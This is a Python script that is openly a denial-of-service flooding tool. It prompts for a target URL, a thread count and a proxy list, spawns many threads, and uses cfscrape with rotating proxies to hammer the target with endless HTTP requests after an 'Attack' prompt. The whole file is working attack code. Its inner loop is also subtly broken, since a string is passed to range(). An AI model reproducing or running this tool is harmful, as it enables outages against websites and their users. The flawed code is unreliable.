import cfscrape
import os
import random
import time
import threading
import colorama
from colorama import Fore

os.system("cls || clear")


def creador():
    for a in range(thr):
        x = threading.Thread(target=atk)
        x.start()
        print(str(a+1) + " Threads Created ")
    print(Fore.CYAN + "Selected Proxy List : " + Fore.WHITE + lista)
    print(Fore.RED + "Loading Threads . . .")
    time.sleep(3)
    input(Fore.YELLOW + "Press Enter to Begin the Attack !")
    global oo
    oo = True

oo = False
def menu():
    global thr
    global lista
    global eipi
    eipi = input(Fore.CYAN + "[+] Target URL : " + Fore.WHITE)
    thr = int(input(Fore.YELLOW + "[+] Threads : " + Fore.WHITE))
    lista = str(input(Fore.GREEN + "[+] Proxy List : [ default = proxy.txt ] " + Fore.WHITE))
    if lista == '':
        lista = 'proxy.txt'
        pass
    creador()
def atk():
    per = '70'
    pprr = open(lista).readlines()
    proxy = random.choice(pprr).strip().split(":")
    s = cfscrape.create_scraper()
    s.proxies = {}
    s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
    s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
    time.sleep(3)
    while True:
        while oo:
            try:
                s.get(eipi)
                print(Fore.GREEN + "[✓] Successful Connection")
                try:
                    for g in range(per):
                        s.get(eipi)
                        print(Fore.GREEN + "[✓] Successful Connection")
                    s.close()
                except:
                    s.close()
            except:
                s.close()
                print(Fore.RED + "[!] Connection Refused")

menu()
